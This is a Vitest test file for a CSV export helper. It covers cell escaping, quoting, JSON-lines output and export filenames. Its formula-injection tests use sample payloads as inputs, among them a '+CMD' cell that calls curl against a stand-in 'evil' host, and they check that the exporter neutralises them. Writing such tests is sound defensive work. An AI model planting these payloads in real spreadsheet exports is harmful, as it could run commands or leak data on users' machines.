/**
 * CSV tests — PRD §9.8.
 *
 * Quoting/escaping, embedded commas/quotes/newlines,
 * formula-injection neutralisation for leading =, +, -, @, tab and CR.
 */
import { describe, it, expect } from "vitest";
import { escapeCsvCell, toCsv, toJsonLines, exportFilename } from "../csv.js";

// ── escapeCsvCell ───────────────────────────────────────────────────────────
describe("escapeCsvCell", () => {
  it("returns empty string for null/undefined", () => {
    expect(escapeCsvCell(null)).toBe("");
    expect(escapeCsvCell(undefined)).toBe("");
  });

  it("leaves plain text unquoted", () => {
    expect(escapeCsvCell("hello")).toBe("hello");
  });

  it("quotes strings containing commas", () => {
    expect(escapeCsvCell("a,b")).toBe('"a,b"');
  });

  it("quotes strings containing double quotes (and escapes them)", () => {
    expect(escapeCsvCell('say "hi"')).toBe('"say ""hi"""');
  });

  it("quotes strings containing newlines", () => {
    expect(escapeCsvCell("line1\nline2")).toBe('"line1\nline2"');
  });

  it("quotes strings containing CR (after formula prefix is added)", () => {
    // "\r=SUM(1)" → prefix added → "'\r=SUM(1)" → contains \r → gets quoted
    const result = escapeCsvCell("\r=SUM(1)");
    // The result is a quoted string: "'\r=SUM(1)" wrapped in double quotes
    expect(result.startsWith('"')).toBe(true);
    expect(result.endsWith('"')).toBe(true);
    expect(result).toContain("=SUM(1)");
    expect(result).toContain("'");
  });

  // ── Formula injection ──────────────────────────────────────────────────────
  it("neutralises leading = with single quote prefix", () => {
    expect(escapeCsvCell("=SUM(A1:A10)")).toBe("'=SUM(A1:A10)");
  });

  it("neutralises leading +", () => {
    expect(escapeCsvCell("+CMD('curl http://evil')")).toBe("'+CMD('curl http://evil')");
  });

  it("neutralises leading -", () => {
    expect(escapeCsvCell("-10+cmd")).toBe("'-10+cmd");
  });

  it("neutralises leading @", () => {
    expect(escapeCsvCell("@SUM(A1)")).toBe("'@SUM(A1)");
  });

  it("neutralises leading tab", () => {
    // "\t=SUM(1)" → prefix → "'\t=SUM(1)" → no special chars → unquoted
    expect(escapeCsvCell("\t=SUM(1)")).toBe("'\t=SUM(1)");
  });

  it("numbers pass through as-is", () => {
    expect(escapeCsvCell(42)).toBe("42");
    expect(escapeCsvCell(0)).toBe("0");
  });

  it("booleans pass through", () => {
    expect(escapeCsvCell(true)).toBe("true");
    expect(escapeCsvCell(false)).toBe("false");
  });
});

// ── toCsv ───────────────────────────────────────────────────────────────────
describe("toCsv", () => {
  it("generates correct header and rows", () => {
    const rows = [
      { name: "Alice", age: 30 },
      { name: "Bob", age: 25 },
    ];
    const csv = toCsv(rows, [
      { id: "name", header: "Name", value: (r) => r.name },
      { id: "age", header: "Age", value: (r) => r.age },
    ]);
    const lines = csv.split("\r\n");
    expect(lines[0]).toBe("Name,Age");
    expect(lines[1]).toBe("Alice,30");
    expect(lines[2]).toBe("Bob,25");
  });

  it("handles formula-injection in data rows", () => {
    const rows = [{ val: "=MALICIOUS" }];
    const csv = toCsv(rows, [{ id: "v", header: "V", value: (r) => r.val }]);
    const lines = csv.split("\r\n");
    expect(lines[1]).toBe("'=MALICIOUS");
  });
});

// ── toJsonLines ─────────────────────────────────────────────────────────────
describe("toJsonLines", () => {
  it("produces newline-delimited JSON", () => {
    const result = toJsonLines([{ a: 1 }, { a: 2 }]);
    const lines = result.split("\n");
    expect(JSON.parse(lines[0]!).a).toBe(1);
    expect(JSON.parse(lines[1]!).a).toBe(2);
  });

  it("empty array → empty string", () => {
    expect(toJsonLines([])).toBe("");
  });
});

// ── exportFilename ──────────────────────────────────────────────────────────
describe("exportFilename", () => {
  it("formats as prefix-YYYY-MM-DD", () => {
    const result = exportFilename("shipments", Date.UTC(2026, 8, 13));
    expect(result).toBe("shipments-2026-09-13");
  });
});
